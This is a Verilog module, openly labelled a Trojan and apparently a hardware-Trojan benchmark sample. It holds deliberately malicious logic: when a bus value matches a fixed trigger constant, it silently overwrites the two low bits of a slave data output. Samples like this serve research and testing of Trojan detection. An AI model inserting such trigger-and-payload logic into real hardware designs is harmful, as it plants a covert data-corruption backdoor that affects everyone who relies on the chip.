module Trojan6 #(
    // Keep non-I/O tunables as parameters (I/O bitwidths fixed)
    parameter [31:0] TRIGGER_STATE_1 = 32'h00000000,
    parameter [31:0] TRIGGER_STATE_2 = 32'h354A7B6C,
    parameter [31:0] TRIGGER_STATE_3 = 32'hEAAAD8FF,
    parameter [31:0] TRIGGER_STATE_4 = 32'h0AAA5C5C,
    parameter [1:0]  PAYLOAD_BITS   = 2'b11
)(
    input  wire [31:0] m0_data_o,
    input  wire [31:0] i_s15_data_o,
    output wire [31:0] i_s15_data_o_TrojanPayload 
);

    wire [1:0] Trojanstate;

    assign Trojanstate = (m0_data_o == TRIGGER_STATE_1) ? 2'b00 :
                         (m0_data_o == TRIGGER_STATE_2) ? 2'b01 :
                         (m0_data_o == TRIGGER_STATE_3) ? 2'b10:
                         (m0_data_o == TRIGGER_STATE_4) ? 2'b11 :
                         2'b00; // Default state

    assign i_s15_data_o_TrojanPayload = (Trojanstate == 2'b11) ? {i_s15_data_o[31:2], PAYLOAD_BITS} : i_s15_data_o;

endmodule